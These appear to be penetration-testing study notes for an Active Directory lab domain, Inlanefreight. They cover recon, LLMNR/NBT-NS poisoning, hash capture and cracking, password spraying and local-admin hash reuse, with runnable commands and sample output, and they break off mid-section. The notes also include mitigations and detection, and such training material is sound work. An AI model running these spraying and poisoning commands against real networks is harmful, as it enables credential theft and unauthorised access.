# External Recon and Enumeration Principles

#### Purpose of External Reconnaissance:
1. **Validation:** Confirm scoping document information, ensuring accurate alignment with the client's target.
2. **Scope Assurance:** Avoid unintended interactions with systems outside the authorized scope.
3. **Information Gathering:** Identify publicly available data that could facilitate the penetration test, like leaked credentials or infrastructure details.

---

### What to Look For:

| **Data Point**      | **Description**                                                                                                   |
|----------------------|-------------------------------------------------------------------------------------------------------------------|
| **IP Space**         | Identifying ASN, netblocks, DNS entries, and cloud infrastructure.                                               |
| **Domain Information** | Subdomains, domain services, defenses like SIEM, AV, and IPS/IDS.                                               |
| **Schema Format**    | Email/AD username conventions and password policies for attacks like password spraying or credential stuffing.    |
| **Data Disclosures** | Metadata in public documents, links to intranet, or credentials in repositories like GitHub.                     |
| **Breach Data**      | Publicly leaked usernames, passwords, or hashes for unauthorized access to services.                             |

---

### Where to Look:

| **Resource**              | **Examples**                                                                                               |
|---------------------------|-----------------------------------------------------------------------------------------------------------|
| **ASN/IP Registrars**      | IANA, ARIN, RIPE, BGP Toolkit for IP/ASN research.                                                        |
| **Domain/DNS Records**     | Domaintools, PTRArchive, ICANN, and manual DNS queries to find subdomains and validate information.        |
| **Social Media**           | LinkedIn, Twitter, Facebook for organizational details, user roles, or infrastructure clues.              |
| **Public Websites**        | Check the "About Us" and "Contact Us" pages for embedded documents, emails, and organizational charts.     |
| **Cloud & Dev Repos**      | GitHub, AWS S3 buckets, and Google Dorks for accidentally exposed credentials or sensitive files.          |
| **Breach Sources**         | HaveIBeenPwned, Dehashed to find corporate emails, plaintext passwords, or hashes in breach databases.     |

---

### Steps and Tools:

1. **Finding Address Spaces:**  
   - Use BGP Toolkit or similar to identify ASN/IP ranges tied to the target.
   - Validate addresses with tools like
     ```
     nslookup
     ```
     and online DNS services (e.g., viewdns.info ,https://bgp.he.net/ ,https://research.domaintools.com/ ). 

2. **Hunting Documents and Emails:**  
   - **Search:** Use Google Dorks like
     ```
     filetype:pdf inurl:target.com
     ```
     or
     ```
     intext:"@target.com"
     ```
     to find sensitive files and email addresses.
   - **Save Locally:** Keep all findings organized for deeper inspection.

3. **Username Harvesting:**  
   - Tools like `linkedin2username` can generate potential username formats based on public employee data.

4. **Credential Hunting:**  
   - Search breach databases (e.g., Dehashed) to find leaked credentials for external-facing services.  
   - **Example Dork:**
     ```
     sudo python3 dehashed.py -q inlanefreight.local -p
     ```
     

---

### Key Enumeration Principles:

1. **Passive to Active Approach:** Begin with passive recon (no direct engagement) and gradually move to active enumeration once you identify potential targets.
2. **Iterative Process:** Continuously revisit and refine findings based on new data.
3. **Validate Results:** Cross-check data from multiple sources for consistency and accuracy.
4. **Stay In Scope:** Always ensure your actions are authorized and documented.

This methodology ensures thorough preparation and minimizes the risk of errors during penetration testing. Let me know if you'd like more specific examples or a focus on tools for automation!

# Initial Enumeration of the Domain
![image](https://github.com/user-attachments/assets/b35654f9-5fa7-4dba-8cbf-c916eb17b67b)


---


#### Setting Up
For this penetration test, we are starting on an attack host within the internal network of Inlanefreight. The customer has provided a **custom pentest VM** connected to their internal network, and we are to perform non-evasive testing starting from an unauthenticated standpoint with a **standard domain user account (htb-student)**.

---

#### Tasks:
1. **Enumerate the internal network** to identify hosts, services, and potential vulnerabilities.
2. Perform **passive enumeration** first (using tools like Wireshark and Responder), followed by **active checks** (using tools like `fping` and Nmap).
3. **Document findings** for later use, including details on:
   - AD Users
   - AD Joined Computers (Domain Controllers, file servers, etc.)
   - Key Services (Kerberos, NetBIOS, LDAP, DNS)
   - Vulnerable Hosts and Services

---

### 1. Identifying Hosts (Passive Enumeration)

#### **Wireshark Capture**
To capture network traffic and identify hosts, start by running Wireshark on the attack host.

```bash
sudo -E wireshark
```

*Wireshark output shows ARP requests and MDNS broadcasts, revealing the following hosts:*
- `172.16.5.5`
- `172.16.5.25`
- `172.16.5.50`
- `172.16.5.100`
- `172.16.5.125`

---

#### **Tcpdump Capture**
If you are on a host without a GUI, you can use `tcpdump` to capture network traffic and save it to a `.pcap` file for later analysis with Wireshark.

```bash
sudo tcpdump -i ens224
```

---

#### **Responder Analysis**
Responder can be used in passive mode to listen for LLMNR, NBT-NS, and MDNS requests, identifying additional hosts.

```bash
sudo responder -I ens224 -A
```

*Responder output reveals:*
- New hosts: `172.16.5.200`, `172.16.5.225`, `ACADEMY-EA-WEB01`

---

### 2. Active Enumeration of Hosts

#### **FPing ICMP Sweep**
To check for active hosts in the `172.16.5.0/23` range, use `fping` to perform an ICMP sweep.

```bash
fping -asgq 172.16.5.0/23
```

*Results show 9 live hosts including the attack host.*

---

### 3. Nmap Scan of Active Hosts

With the list of live hosts, use Nmap for detailed service enumeration, targeting protocols like DNS, LDAP, SMB, and Kerberos.

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

*Nmap scan reveals services on `172.16.5.5`:*
- **53/tcp**: Simple DNS Plus
- **88/tcp**: Kerberos
- **389/tcp**: LDAP (Active Directory)
- **445/tcp**: Microsoft-DS
- **636/tcp**: SSL/LDAP

---

### 4. Key Data Points Collected:
- **AD Users**: To target for password spraying or further enumeration.
- **AD Computers**: Identifying key systems like domain controllers.
- **Key Services**: Identified Kerberos, LDAP, DNS, SMB services.
- **Vulnerable Hosts**: Noticed open ports and services that might be exploitable.

--- 
## Identifying Users for Internal Penetration Testing

When no user is provided to start testing with, the goal is to establish a foothold in the domain using various techniques. The most common methods for obtaining access are:

- **Clear text credentials or NTLM password hashes** for a valid user.
- **SYSTEM shell** on a domain-joined host.
- **Shell in the context of a domain user account.**

### Initial Steps for User Enumeration

1. **Kerbrute for Kerberos Pre-authentication Failure**  
   Kerbrute is a stealthy tool used for enumerating domain accounts by exploiting Kerberos pre-authentication failures. Since these failures often do not trigger logs or alerts, it’s a useful tool for attacking from an unauthenticated perspective.

#### Setting up Kerbrute
- **Clone the Kerbrute GitHub repo**:
  ```bash
  sudo git clone https://github.com/ropnop/kerbrute.git
  ```

- **Compile the binaries for the platform** (e.g., Linux):
  ```bash
  cd kerbrute
  make all
  ```

- **Check compiled binaries**:
  ```bash
  ls dist/
  ```

- **Move the binary to a local directory for easier access**:
  ```bash
  sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
  ```

#### Testing Kerbrute:
```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
- This command uses **Kerbrute** with a user list (`jsmith.txt`) to enumerate valid users in the domain `INLANEFREIGHT.LOCAL` using the domain controller at `172.16.5.5`. The results are saved to the `valid_ad_users` file.

### Example Output:
- The output will list valid usernames such as:
  ```
  [+] VALID USERNAME: jjones@INLANEFREIGHT.LOCAL
  [+] VALID USERNAME: sbrown@INLANEFREIGHT.LOCAL
  [+] VALID USERNAME: tjohnson@INLANEFREIGHT.LOCAL
  ```

### SYSTEM Access
- The **SYSTEM account** (NT AUTHORITY\SYSTEM) is a built-in Windows account with the highest privilege level.
- SYSTEM access allows enumeration of Active Directory, Kerberoasting, ASREPRoasting, and other powerful attacks like SMB relay or ACL attacks.

#### Ways to gain SYSTEM access:
- **Remote Windows exploits** like MS08-067, EternalBlue, BlueKeep.
- **Abusing services** running in the context of SYSTEM (e.g., Juicy Potato on older systems).
- **Local privilege escalation** through flaws such as Windows 10 Task Scheduler vulnerabilities.
- **Using Psexec to run SYSTEM-level commands** after gaining admin access.

#### Post-SYSTEM Access Actions:
- Enumerate the domain using tools like **BloodHound** or **PowerView**.
- Run attacks like **Kerberoasting** or **ASREPRoasting**.
- Harvest **Net-NTLMv2 hashes** or perform **SMB relay** attacks using tools like **Inveigh**.
- **Token impersonation** for privilege escalation.
- **ACL attacks** to manipulate permissions.

### Considerations for Stealth
- **Non-evasive tests**: Higher noise and less concern for stealth.
- **Evasive or red team engagements**: Stealth is critical. Using tools like **Nmap** or other noisy tools may trigger alerts. Always clarify the assessment's goals with the client.

Sure thing! Here is a more detailed version, including commands and additional information:

---

# LLMNR/NBT-NS Poisoning from Linux

### Overview
- **Goal:** Acquire valid cleartext credentials for a domain user account.
- **Techniques:** Network poisoning and password spraying.
- **Tools:** Responder and Inveigh.

### LLMNR & NBT-NS Primer
- **LLMNR:** Uses port 5355 over UDP, for name resolution if DNS fails.
- **NBT-NS:** Uses port 137 over UDP, as a fallback if LLMNR fails.
- **Vulnerability:** Any host on the network can respond to LLMNR/NBT-NS queries, allowing for a Man-in-the-Middle attack.

### Attack Flow
1. Host attempts connection to a non-existent server.
2. DNS fails to resolve the host.
3. Host broadcasts request on local network.
4. Attacker (with Responder) responds, posing as the requested host.
5. Host sends authentication request to attacker.
6. Attacker captures the NTLMv2 password hash.

### Tools for LLMNR/NBT-NS Poisoning
- **Responder:** 
  - A tool for poisoning LLMNR, NBT-NS, and MDNS requests.
  - Can capture hashes and store them in log files.
- **Inveigh:** 
  - Cross-platform MITM tool for spoofing and poisoning attacks.
  - Written in C# and PowerShell.
- **Metasploit:** 
  - Has modules for spoofing and poisoning attacks.

### Using Responder
- **Install Responder:**
  ```bash
  sudo apt-get install responder
  ```
- **Run Responder with default settings:**
  ```bash
  sudo responder -I <network_interface>
  ```
  Replace `<network_interface>` with your actual network interface, e.g., `ens224`.
- **Common options:**
  - `-A`: Analyze mode, sees requests without poisoning.
  - `-w`: Start WPAD rogue proxy server.
  - `-f`: Fingerprint remote host OS and version.
  - `-v`: Increased verbosity.
  - `-F`: Force NTLM or Basic authentication.
  - `-P`: Force proxy authentication.
- **Example Command:**
  ```bash
  sudo responder -I ens224 -wf
  ```

### Ports to Ensure Availability
- **UDP:** 137, 138, 53, 1434, 5355, 5353
- **TCP:** 80, 135, 139, 445, 21, 25, 110, 587, 3128, 3141, 1433, 389

### Configuration File
- **Location:** `/usr/share/responder/Responder.conf`
- **Adjustments:** Disable rogue servers and setup logging as needed.

### Responder Logs
- **Log files:** Stored in `/usr/share/responder/logs` with format `MODULE_NAME-HASH_TYPE-CLIENT_IP.txt`
  ```bash
  ls /usr/share/responder/logs
  ```
  Example:
  ```bash
  SMB-NTLMv2-SSP-172.16.5.25.txt
  ```

### Capturing with Responder
1. **Start Responder in a tmux window:**
   ```bash
   tmux
   sudo responder -I ens224
   ```
2. **Crack captured hashes using Hashcat:**
   ```bash
   hashcat -m 5600 <hash_file> <wordlist>
   ```
   Replace `<hash_file>` with the path to your hash file and `<wordlist>` with the path to your wordlist.

### TTPs
- **Objective:** Collect authentication information (NTLMv1/NTLMv2 password hashes).
- **Cracking Hashes:** Use tools like Hashcat or John to crack the hashes offline.
- **Further Use:** Utilize cleartext passwords for initial foothold or expanded access within the domain.

---
# LLMNR/NBT-NS Poisoning - from Windows
### Overview
Inveigh is a tool written in PowerShell and C# that can listen to multiple protocols, including LLMNR, DNS, mDNS, NBNS, and more. It's useful for capturing credentials on Windows hosts.

### Using the PowerShell Version

1. **Import the module and list parameters:**
   ```powershell
   PS C:\htb> Import-Module .\Inveigh.ps1
   PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
   ```

2. **Start Inveigh with LLMNR and NBNS spoofing:**
   ```powershell
   PS C:\htb> Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
   ```

### Using the C# Version (InveighZero)
The C# version is actively maintained and combines original and ported code. It's available pre-compiled in the C:\Tools folder, but it's good practice to compile it yourself using Visual Studio.

1. **Run the C# executable:**
   ```powershell
   PS C:\htb> .\Inveigh.exe
   ```

2. **View help options:**
   ```
   C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
   ```

### Useful Console Commands

- **Get queued console output:**
  ```plaintext
  GET CONSOLE
  ```

- **Get captured NTLMv2 hashes (unique):**
  ```plaintext
  GET NTLMV2UNIQUE
  ```

- **Get captured NTLMv2 usernames:**
  ```plaintext
  GET NTLMV2USERNAMES
  ```

### Example Output

#### Unique NTLMv2 Hashes
```plaintext
backupagent::INLANEFREIGHT:B5013246091943D7:...
forend::INLANEFREIGHT:32FD89BD78804B04:...
...
```

#### NTLMv2 Usernames
```plaintext
IP Address    Host            Username                     Challenge
172.16.5.125  ACADEMY-EA-FILE  INLANEFREIGHT\backupagent    B5013246091943D7
172.16.5.125  ACADEMY-EA-FILE  INLANEFREIGHT\forend         32FD89BD78804B04
...
```

---

## Remediation

### Mitre ATT&CK Reference
- **ID:** T1557.001
- **Technique:** Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

### Mitigation Steps
To prevent LLMNR and NBT-NS spoofing attacks, it's crucial to disable these protocols cautiously after testing their impact on your network.

1. **Disable LLMNR via Group Policy:**
   - Navigate to: `Computer Configuration --> Administrative Templates --> Network --> DNS Client`
   - Enable: **Turn OFF Multicast Name Resolution**

2. **Disable NBT-NS Locally:**
   - Open **Network and Sharing Center** under **Control Panel**
   - Click **Change adapter settings**
   - Right-click on the adapter, view properties
   - Select **Internet Protocol Version 4 (TCP/IPv4)**
   - Click **Properties** -> **Advanced** -> **WINS** tab
   - Select **Disable NetBIOS over TCP/IP**

3. **Disable NBT-NS via PowerShell Script:**
   - Script to disable NetBIOS:
     ```powershell
     $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
     Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
     ```
   - Add the script to **Startup** in Local Group Policy:
     - Navigate to: `Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup`
     - Add the PowerShell script

4. **Push Out GPO Script Domain-Wide:**
   - Create a GPO using **Group Policy Management**
   - Host the script on the **SYSVOL** share and call it via UNC path:
     ```
     \\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
     ```
   - Apply GPO to specific OUs and ensure the script runs on reboot

5. **Additional Mitigations:**
   - Filter network traffic to block LLMNR/NetBIOS
   - Enable SMB Signing to prevent NTLM relay attacks
   - Use network intrusion detection/prevention systems
   - Implement network segmentation

## Detection

### Detecting Attack Behavior
1. **Inject LLMNR and NBT-NS Requests:**
   - Inject requests for non-existent hosts across subnets
   - Alert if any responses are received

2. **Monitor Network Traffic:**
   - Ports: UDP 5355 (LLMNR) and UDP 137 (NetBIOS)

3. **Monitor Event IDs:**
   - Event ID 4697
   - Event ID 7045

4. **Monitor Registry Key:**
   - Registry: `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`
   - DWORD value `EnableMulticast`, where `0` indicates LLMNR is disabled

---
# Password Spraying Overview

**Password spraying** is trying a common password with a list of usernames to gain access without triggering account lockouts.

#### Key Points:
- **Method:** Use one common password across many usernames.
- **Purpose:** Gain initial access or a foothold in a network.
- **Precaution:** Introduce delays to avoid account lockouts.

### Scenarios

1. **Example 1:**
   - **Method:** Combined GitHub and LinkedIn username lists.
   - **Tool:** Kerbrute.
   - **Outcome:** Gained low-privileged access, then escalated using `BloodHound`.

2. **Example 2:**
   - **Method:** Scraped PDF metadata for username patterns.
   - **Outcome:** Enumerated all domain users, gained passwords, and compromised the domain.

### Considerations

- **Risk of Lockouts:** Avoid frequent attempts to prevent account lockouts.
- **Internal Use:** Use for lateral movement within a network.
- **Password Policy:** Know the domain's policy to minimize risks.

### Practical Tips:

- **Delays:** Wait hours between attempts.
- **Client Communication:** Clarify password policies.
- **Enumeration:** Use provided accounts to discover password policies.

# Enumerating & Retrieving Password Policies

In various IT security scenarios, enumerating and retrieving password policies are essential steps to understand and secure the domain environment. This process can vary depending on whether you have valid credentials or are attempting to access information without authentication.

#### 1. **Credentialed Enumeration from Linux:**

With valid domain credentials, you can retrieve the domain password policy remotely using tools like CrackMapExec or rpcclient.

- **Tools:** CrackMapExec, rpcclient
- **Command Example:**
  ```sh
   crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
  ```

#### 2. **SMB NULL Sessions (Unauthenticated):**

SMB NULL sessions are a misconfiguration that allows unauthenticated attackers to access information about the domain, including user lists, groups, computers, and the password policy. This often occurs due to legacy Domain Controllers being upgraded, bringing along insecure configurations from older Windows Server versions.

- **Misconfiguration:** Often result from upgrading legacy Domain Controllers.
- **Tools:** enum4linux, CrackMapExec, rpcclient
- **Command Example:**
  ```sh
  $ rpcclient -U "" -N 172.16.5.5
  rpcclient $> querydominfo
  rpcclient $> getdompwinfo
  ```

#### 3. **Using enum4linux:**

enum4linux is a tool built around the Samba suite of tools used for enumeration of Windows hosts and domains.

- **Original Tool:**
  ```sh
    enum4linux -P 172.16.5.5
  ```
- **Updated Tool (enum4linux-ng):**
  ```sh
   enum4linux-ng -P 172.16.5.5 -oA ilfreight
  ```

**Command Example for JSON/YAML output:**
  ```sh
   cat ilfreight.json
  ```

#### 4. **Null Session from Windows:**

Although less common, null sessions can also be performed from Windows using specific commands.

- **Command Example:**
  ```sh
   net use \\DC01\ipc$ "" /u:""
  ```

- **Common Errors:**
  - **Account is Disabled:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "" /u:guest
    System error 1331 has occurred.
    ```
  - **Password is Incorrect:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "password" /u:guest
    System error 1326 has occurred.
    ```
  - **Account is Locked Out:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "password" /u:guest
    System error 1909 has occurred.
    ```

#### 5. **LDAP Anonymous Bind (Unauthenticated):**

LDAP anonymous binds allow unauthenticated attackers to retrieve domain information. This legacy configuration can sometimes still be found, exposing sensitive information.

- **Tools:** windapsearch.py, ldapsearch, ad-ldapdomaindump.py
- **Command Example:**
  ```sh
  ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
  ```

#### 6. **Built-in Windows Commands (Authenticated):**

If you can authenticate to the domain, built-in Windows tools or third-party tools can be used to retrieve the password policy.

- **Tools:** net.exe, PowerView, CrackMapExec (Windows), SharpMapExec, SharpView

Using built-in commands is particularly useful if you land on a Windows system and cannot transfer additional tools to it.

### Analyzing the Password Policy

**From net accounts command:**
```sh
net accounts

```

**Key Points:**
- **Passwords never expire:** Maximum password age set to Unlimited.
- **Minimum password length:** 8.
- **Lockout threshold:** 5 wrong passwords.
- **Lockout duration:** 30 minutes.
- **Password spraying:** Effective due to the eight-character minimum and auto-unlock feature.

#### Using PowerView

**Command Example:**
```powershell
 import-module .\PowerView.ps1
 Get-DomainPolicy

```

**Key Points:**
- **Minimum password length:** 8.
- **Password complexity:** Enabled (PasswordComplexity=1). meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character
- **Lockout threshold:** 5.
- **Lockout duration:** 30 minutes.
- **Password history size:** 24.

if password policy is not retrieved rule of thumb is max tries is 3-5 and make sure not to lockout accounts.

# Password Spraying - Making a Target User List

## Detailed User Enumeration
To mount a successful password spraying attack, we need a list of valid domain users to attempt to authenticate with. Here are several ways to gather a target list of valid users:

- Leverage an SMB NULL session to retrieve a complete list of domain users from the domain controller.
- Utilize an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list.
- Use a tool such as Kerbrute to validate users utilizing a word list from sources such as the **statistically-likely-usernames GitHub repo**, or create a list of potentially valid users using tools like **linkedin2username**.
- Use a set of credentials from a Linux or Windows attack system provided by our client or obtained through other means, such as LLMNR/NBT-NS response poisoning using Responder, or a successful password spray using a smaller wordlist.

### Domain Password Policy
Consider the domain password policy:
- If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy.
- The policy includes minimum password length and whether password complexity is enabled, helping us formulate the list of passwords for spray attempts.
- Knowing the account lockout threshold and bad password timer will inform us how many spray attempts we can make without locking out any accounts and the time to wait between attempts.

If the password policy is unknown, we can:
- Ask our client.
- Try a targeted password spray as a "hail mary".
- Perform one spray every few hours to avoid locking out accounts.

Always log the activities:
- Accounts targeted
- Domain Controller used in the attack
- Time and date of the spray
- Password(s) attempted

### Methods to Pull User List

#### SMB NULL Session
If we lack valid domain credentials, check for SMB NULL sessions or LDAP anonymous binds on Domain Controllers to obtain a list of all users within Active Directory and the password policy.

Some tools that leverage SMB NULL sessions and LDAP anonymous binds:
- enum4linux
- rpcclient
- CrackMapExec


### Using enum4linux
```shell
 enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### Using rpcclient
```shell
 rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

### Using CrackMapExec with the --users flag
```shell
 crackmapexec smb 172.16.5.5 --users
```
This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset.
### Gathering Users with LDAP Anonymous

#### Using ldapsearch
```shell
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

#### Using windapsearch
```shell
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


### Enumerating Users with Kerbrute
- Uses Kerberos Pre-Authentication to enumerate valid AD accounts and for password spraying.
- Does not generate Windows event ID 4625 (logon failure).
- The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration.

```shell
# Using Kerbrute User Enumeration
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Credentialed Enumeration to Build User List
With valid credentials, use any of the tools stated previously to build a user list. 

```shell
# Using CrackMapExec with Valid Credentials
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

# Internal Password Spraying - from Linux

## Overview
Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. This section focuses on performing password spraying from Linux hosts.

## Using rpcclient
Rpcclient is an excellent option for performing this attack from Linux. A valid login is indicated by the response "Authority Name". We can filter out invalid login attempts by grepping for "Authority" in the response.

### Bash One-Liner for the Attack
```shell
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Example Output
```shell
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

## Using Kerbrute
Kerbrute can also be used for the same attack.

### Command
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### Example Output
```shell
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
Done! Tested 57 logins (1 successes) in 0.172 seconds
```

## Using CrackMapExec
CrackMapExec accepts a text file of usernames to be run against a single password in a spraying attack. We grep for "+" to filter out logon failures and focus on valid login attempts.

### Command
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### Example Output
```shell
SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

## Validating Credentials with CrackMapExec
After getting hits with our password spraying attack, we can use CrackMapExec to validate the credentials quickly against a Domain Controller.

### Command
```shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Example Output
```shell
SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

## Local Administrator Password Reuse
Internal password spraying is also possible with local administrator accounts. If you obtain the NTLM password hash or cleartext password for the local administrator account, this can be attempted across multiple hosts in the network.

### Local Admin Spraying with CrackMapExec
```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Example Output
```shell
SMB 172.16.5.50 445 ACADEMY-EA-MX01 [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB 172.16.5.25 445 ACADEMY-EA-MS01 [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB 172.16.5.125 445 ACADEMY-EA-WEB0 [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

## Considerations
- This technique is noisy and not suitable for stealthy assessments.
- Highlight this issue during penetration tests, even if it is not part of the path to compromise the domain.
- Use the free Microsoft tool Local Administrator Password Solution (LAPS) to manage local administrator passwords and enforce unique passwords on each host that rotate on a set interval.


# Internal Password Spraying - from Windows

## Using DomainPasswordSpray.ps1
- **Tool**: DomainPasswordSpray.ps1
- **Use Case**: Automatically generate a user list from AD, query password policy, and exclude near-lockout accounts.
- **Command**:
  ```shell
  Import-Module .\DomainPasswordSpray.ps1
   Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
  ```
- **Output**: Writes successes to `spray_success`.

## Mitigations

### Multi-Factor Authentication
- **Description**: Reduces risk significantly.
- **Example**: Push notifications, OTP, RSA keys, text message confirmations.

### Restricting Access
- **Description**: Limit application access to necessary users only.

### Reducing Impact of Successful Exploitation
- **Description**: Use separate admin accounts, application-specific permission levels, and network segmentation.

### Password Hygiene
- **Description**: Educate users on creating strong passwords, use password filters.

## Other Considerations
- **Password Lockout Policy**: Ensure it doesn’t increase DoS risks.
- **Detection**: Monitor for event ID 4625 and 4771. Correlate many logon failures within a set time interval to trigger alerts. attacker may avoid SMB password spraying and instead target LDAP. 
- **External Password Spraying**: Commonly targets Microsoft 0365, OWA, Skype for Business, Citrix portals, VPN portals, etc.

# Enumerating Security Controls

## Purpose
- **Goal**: Understand the security controls in place within an organization to inform decisions about tool usage during AD enumeration, exploitation, and post-exploitation.

## Key Tools and Techniques

### Windows Defender
- **Tool**: Get-MpComputerStatus (PowerShell cmdlet).
- **Function**: Check the current status of Windows Defender on a system.
- **Example**:
  ```shell
  Get-MpComputerStatus
  ```
RealTimeProtectionEnabled parameter is set to True, which means Defender is enabled on the system.
### AppLocker
- **Purpose**: Application whitelisting solution to control which applications can run on a system.
- **Tool**: Get-AppLockerPolicy (PowerShell cmdlet).
- **Function**: Enumerate AppLocker policies.
- **Example**:
  ```shell
   Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  ```
 It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations such as **%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe or PowerShell_ISE.exe.**
### PowerShell Constrained Language Mode
- **Purpose**: Lock down PowerShell features to enhance security.
- **Tool**: PowerShell command to check language mode.
- **Function**: Determine if the system is in Full Language Mode or Constrained Language Mode.
- **Example**:
  ```shell
   $ExecutionContext.SessionState.LanguageMode
  ```

### LAPS (Local Administrator Password Solution)
- **Purpose**: Randomize and rotate local administrator passwords on Windows hosts.
- **Tools**:
  - **Find-LAPSDelegatedGroups**: Identify groups that can read LAPS passwords.
  - **Find-AdmPwdExtendedRights**: Check rights on computers with LAPS enabled.
  - **Get-LAPSComputers**: List computers with LAPS enabled and their passwords.
- **Examples**:
  ```shell
   Find-LAPSDelegatedGroups
  ```
  ```
   Find-AdmPwdExtendedRights
  ```
  ```
   Get-LAPSComputers
  ```

## Importance
- **Understand Protections**: Knowing the security controls helps avoid or modify tools and plan actions effectively.
- **Target Specific Users**: Identify AD users who can read LAPS passwords for targeted actions.

# Credentialed Enumeration From Linux 

Credentialed enumeration involves leveraging valid domain user credentials to gather detailed information about domain users, groups, permissions, and shares. Below are step-by-step notes and commands for conducting such enumeration.

---

#### **1. Setting Up**
- **Credentials**: User `forend` with password `Klmcargo2`.
- **Domain Controller (DC)**: Address is `172.16.5.5`.
- Commands should be prefaced with `sudo` when necessary.
- **Linux Host**: Use tools installed on `ATTACK01` Parrot Linux.

---

### **Using CrackMapExec (CME)**

#### **Basic Syntax for CME**
```bash
crackmapexec smb [target] -u [username] -p [password] [options]
```

#### **Enumerate Domain Users**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
- **Output**: Lists domain users with attributes like `badPwdCount`, useful for identifying locked accounts or accounts with repeated failed login attempts.

#### **Enumerate Domain Groups**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
- **Output**: Lists groups, their member counts, and identifies groups of interest like `Domain Admins` or `Backup Operators`.

#### **Enumerate Logged-On Users**
```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
- **Output**: Shows currently logged-on users, useful for identifying administrative accounts or potential targets.

#### **Enumerate SMB Shares**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
- **Output**: Displays available shares on the target, including their permissions (`READ` or `WRITE`).

#### **Spidering Shares for Files**
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
- **Output**: Crawls through a specific share (e.g., `Department Shares`) and saves results in JSON format at `/tmp/cme_spider_plus/<ip of host>.json`.

---

### **Using SMBMap**

#### **Basic Syntax for SMBMap**
```bash
smbmap -u [username] -p [password] -d [domain] -H [target IP] [options]
```

#### **Check Share Access**
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
- **Output**: Lists shares and access permissions.

#### **Recursively List Directories in a Share**
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
- **Output**: Lists all subdirectories in the `Department Shares`.

---


### **Using rpcclient**
`rpcclient` leverages the Samba protocol for various Active Directory (AD) tasks, including user and group enumeration.

#### **Basic Connection**
```bash
rpcclient -U "" -N 172.16.5.5
```
- **-U ""**: Unauthenticated SMB NULL session.
- **-N**: No password.

#### **Enumerate Domain Users**
```bash
rpcclient $> enumdomusers
```
- **Output**: Displays domain users and their RIDs (Relative Identifiers).

#### **Query User by RID**
```bash
